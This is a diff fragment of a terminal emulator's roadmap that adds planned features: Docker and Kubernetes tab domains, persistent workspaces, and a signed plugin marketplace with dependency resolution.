+  [CHANGELOG.md §0.7.1](CHANGELOG.md#071--2026-04-19).
+- 💭 **Domain abstraction** à la WezTerm: `DockerDomain` lists
+  `docker ps`, opens a tab via `docker exec -it`; `KubeDomain` lists
+  pods, opens via `kubectl exec`. Reuses the SSH bookmark UI shell.
+- 💭 **Persistent workspaces**: save/restore entire tab+split layout +
+  scrollback to disk; one-click "resume yesterday's dev session."
 
 ### 📦 Distribution readiness (H5–H7, H13)
 
@@ -1250,6 +1598,17 @@ distro." Each sub-bullet can ship independently once H1–H4 land.
   built-in capability-audited Lua plugin system + AI triage +
   first-class shell-integration blocks**. Measure via watching
   the GitHub stars + install metrics, not vanity.
+
+### 🔌 Plugins — marketplace
+
+- 📋 **Signed plugin packaging**: Ed25519 sig over a tarball containing
+  `init.lua`, `manifest.json`, and optional assets. Loader verifies
+  against a project-maintained keyring + (optionally) user-added keys.
+- 📋 **Public marketplace index**: static JSON hosted on GitHub Pages
+  listing name, version, author, signature-status, permission summary.
+  Settings → Plugins → Browse lists them with an install button.
+- 📋 **Plugin dependency resolution**: `manifest.json` `requires: [...]`
+  field; install flow resolves transitively.
 
 ### 🖥 Platform
 
